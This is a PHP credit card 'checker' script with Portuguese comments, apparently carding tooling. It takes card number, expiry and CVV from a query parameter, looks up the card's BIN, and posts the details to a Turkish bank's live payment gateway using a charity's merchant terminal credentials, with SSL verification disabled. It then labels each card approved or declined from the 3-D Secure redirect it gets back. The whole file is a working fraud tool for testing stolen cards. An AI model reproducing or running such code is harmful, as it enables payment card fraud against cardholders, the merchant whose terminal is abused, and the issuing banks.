<?php
///API BB TESTE NAO SEI SE RODA BEM EM HOST MAIS TA AE TEATEM
error_reporting(0);

if (file_exists("cookie.txt")) {
unlink("cookie.txt");}

$time = time();

function multiexplode($delimiters, $string) {
$one = str_replace($delimiters, $delimiters[0], $string);
$two = explode($delimiters[0], $one);
return $two;}

///Divisorias
$lista = $_GET['lista'];
$cc = multiexplode(array("|", " "), $lista)[0];
$mes = multiexplode(array("|", " "), $lista)[1];
$ano = multiexplode(array("|", " "), $lista)[2];
$cvv = multiexplode(array("|", " "), $lista)[3];




///BIN BUSCA
$bin = substr($cc, 0, 6); 

$file = 'bins.csv'; 

$searchfor = $bin; 
$contents = file_get_contents($file); 
$pattern = preg_quote($searchfor, '/'); 
$pattern = "/^.*$pattern.*\$/m"; 
if (preg_match_all($pattern, $contents, $matches)) { 
  $encontrada = implode("\n", $matches[0]); 
} 
$pieces = explode(";", $encontrada); 
$c = count($pieces); 
if ($c == 8) { 
  $pais = $pieces[4]; 
  $paiscode = $pieces[5]; 
  $banco = $pieces[2]; 
  $level = $pieces[3]; 
  $bandeira = $pieces[1]; 
}else { 
  $pais = $pieces[5]; 
  $paiscode = $pieces[6]; 
  $level = $pieces[4]; 
  $banco = $pieces[2]; 
  $bandeira = $pieces[1]; 
} 
 
$bin_result = "$bandeira $banco $level $pais";
$bin=substr($cc,0,6);

function getStr($string, $start, $end) {
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];}

$card=explode("|",$_GET['lista']);
$cc=$card[0];
$time = time();
$bin = substr($cc, 0, 2);
$mes=$card[1];
$ano=$card[2];
$cvv=$card[3];


function getStr2($string, $start, $end) {
	$str = explode($start, $string);
	$str = explode($end, $str[1]);
	return $str[0];
}

function dadosnome() {
	$nome = file("lista_nomes.txt");
	$mynome = rand(0, sizeof($nome)-1);
	$nome = $nome[$mynome];
	return $nome;
}
function dadossobre() {
	$sobrenome = file("lista_sobrenomes.txt");
	$mysobrenome = rand(0, sizeof($sobrenome)-1);
	$sobrenome = $sobrenome[$mysobrenome];
	return $sobrenome;

}

$cc3 = chunk_split($cc, 4, '+');
$cc2 = substr($cc3, 0, -1);

$ano2 = substr($ano, 2);


//DONATE: >>>>>> https://wannacat.org/donate-en/


///CURL PAGAMETO
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://sanalposprov.garanti.com.tr/servlet/gt3dengine");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(

'Host: sanalposprov.garanti.com.tr',
'Upgrade-Insecure-Requests: 1',
'User-Agent: Mozilla/5.0 (Linux; Android 7.1.2; SM-J105H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36',
'Origin: https://sanalposprov.garanti.com.tr',
'Content-Type: application/x-www-form-urlencoded',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
'Referer: https://atosev.org.tr/odeme/kredikartikontrol',
)); 
curl_setopt($ch, CURLOPT_POSTFIELDS, 'secure3dsecuritylevel=3D_FULL&cardnumber='.$cc.'&cardexpiredatemonth='.$mes.'&cardexpiredateyear='.$ano2.'&cardcvv2='.$cvv.'&mode=PROD&apiversion=v0.01&terminalprovuserid=PROVAUT&terminaluserid=PROVAUT&terminalmerchantid=597233&txntype=sales&txnamount=5000&txncurrencycode=949&txninstallmentcount=0&orderid=01B6N57248&terminalid=10194344&successurl=https%3A%2F%2Fatosev.org.tr%2Fodeme%2Fpaymentresult&errorurl=https%3A%2F%2Fatosev.org.tr%2Fodeme%2Fpaymentresult&customeripaddress=127.0.0.1&customeremailaddress=eticaret%40garanti.com.tr&secure3dhash=DE72F86D2480CE667DA452FAA714FF0A35C45359');

$result = curl_exec($ch);

//echo $result;
//exit();
#Fim
$pareq=urlencode(getstr($result,'"PaReq" value="','"'));
$term=urlencode(getstr($result,'"TermUrl" value="','"'));
$md=urlencode(getstr($result,'"MD" value="','"'));


if(strpos($result, "https://verifiedbyvisa.secureacs.com/")){
    

echo '<font class="badge badge-success"><b> Aprovada✔ </font> ➔ ' . $cc . '|' . $mes . '|' . $ano . '|'.$cvv.' |  <font class="badge badge-success"><b> Cartão SICREDI VISA </font> | @ColtSeals </b></font></span><br>';
        flush();
        ob_flush();
		
    }elseif(strpos($result, "https://mastercardsecurecode.secureacs.com/")){
        echo '<font class="badge badge-success"><b> Aprovada✔ </font> ➔ ' . $cc . '|' . $mes . '|' . $ano . '|'.$cvv.' |  <font class="badge badge-success"><b> Cartão SICREDI MASTER </font> | @ColtSeals </b></font></span><br>';
        flush();
        ob_flush();

// BANCO GRINGO 02

  }elseif(strpos($result, "https://channel-cards-html.lloydsbankinggroup.com/")){
        echo '<font class="badge badge-success"><b> Aprovada✔ </font> ➔ ' . $cc . '|' . $mes . '|' . $ano . '|'.$cvv.' |  <font class="badge badge-success"><b> Cartão TESTE 02 MASTER </font> | @ColtSeals </b></font></span><br>';
        flush();
        ob_flush();
		

;
   
   // banco do brasil
   
       }elseif(strpos($result, "www58.bb.com.br")){
        echo '<font class="badge badge-success"><b> Aprovada✔ </font> ➔ ' . $cc . '|' . $mes . '|' . $ano . '|'.$cvv.' |  <font class="badge badge-success"><b> Cartão BB VISA </font>  | @ColtSeals </b></font></span><br>';
        flush();
        ob_flush();
        
            }elseif(strpos($result, "www66.bb.com.br")){
        echo '<font class="badge badge-success"><b> Aprovada✔ </font> ➔ ' . $cc . '|' . $mes . '|' . $ano . '|'.$cvv.' |  <font class="badge badge-success"><b> Cartão BB MASTER </font> | @ColtSeals </b></font></span><br>';
        flush();
        ob_flush();
        
        // itau
                
            }elseif(strpos($result, "https://site-exemplo.com")){
        echo '<font class="badge badge-success"><b> Aprovada✔ </font> ➔ ' . $cc . '|' . $mes . '|' . $ano . '|'.$cvv.' |  <font class="badge badge-success"><b> teste </font> | @ColtSeals </b></font></span><br>';
        flush();
        ob_flush();
        
        // PORTO
        
               }elseif(strpos($result, "https://authentication.cardinalcommerce.com")){
        echo '<font class="badge badge-success"><b> Aprovada✔ </font> ➔ ' . $cc . '|' . $mes . '|' . $ano . '|'.$cvv.' |  <font class="badge badge-success"><b> Cartão PORTO MASTER </font> | @ColtSeals </b></font></span><br>';
        flush();
        ob_flush();
        
        
                // santander
        
               }elseif(strpos($result, "https://authentication.cardinalcommerce.com")){
        echo '<font class="badge badge-success"><b> Aprovada✔ </font> ➔ ' . $cc . '|' . $mes . '|' . $ano . '|'.$cvv.' |  <font class="badge badge-success"><b> Cartão PORTO MASTER </font> | @ColtSeals </b></font></span><br>';
        flush();
        ob_flush();
                        // CREDIT ONE BANK
        
               }elseif(strpos($result, "https://secure2.arcot.com/")){
        echo '<font class="badge badge-success"><b> Aprovada✔ </font> ➔ ' . $cc . '|' . $mes . '|' . $ano . '|'.$cvv.' |  <font class="badge badge-success"><b> Cartão CREDIT ONE BANK VISA </font> | @ColtSeals </b></font></span><br>';
        flush();
        ob_flush();
        
        //BANCOMER, S.A. MEXICO
        
                       }elseif(strpos($result, "ecom.eglobal.com.mx")){
        echo '<font class="badge badge-success"><b> Aprovada✔ </font> ➔ ' . $cc . '|' . $mes . '|' . $ano . '|'.$cvv.' |  <font class="badge badge-success"><b> Cartão  BANCOMER </font> | @ColtSeals </b></font></span><br>';
        flush();
        ob_flush();
        
                //BANCO ORIGINAL
        
                       }elseif(strpos($result, "https://bancooriginal-tas-t3di.com/")){
        echo '<font class="badge badge-success"><b> Aprovada✔ </font> ➔ ' . $cc . '|' . $mes . '|' . $ano . '|'.$cvv.' |  <font class="badge badge-success"><b> Cartão BANCO ORIGINAL </font> | @ColtSeals </b></font></span><br>';
        flush();
        ob_flush();
        
                        //BANCO ITALY
        
                       }elseif(strpos($result, "https://acs.mercurypaymentservices.it/")){
        echo '<font class="badge badge-success"><b> Aprovada✔ </font> ➔ ' . $cc . '|' . $mes . '|' . $ano . '|'.$cvv.' |  <font class="badge badge-success"><b> Cartão BANCO ITALY </font> | @ColtSeals </b></font></span><br>';
        flush();
        ob_flush();

        
	}else{
        echo '<font class="badge badge-danger"><b> Reprovada🙁 </font> ➔ ' . $cc . '|' . $mes . '|' . $ano . '|'.$cvv.' | Retorno: Cartão Recusado<font style="color: purple"></b></font></span><br>';
        flush();
        ob_flush();
}

?>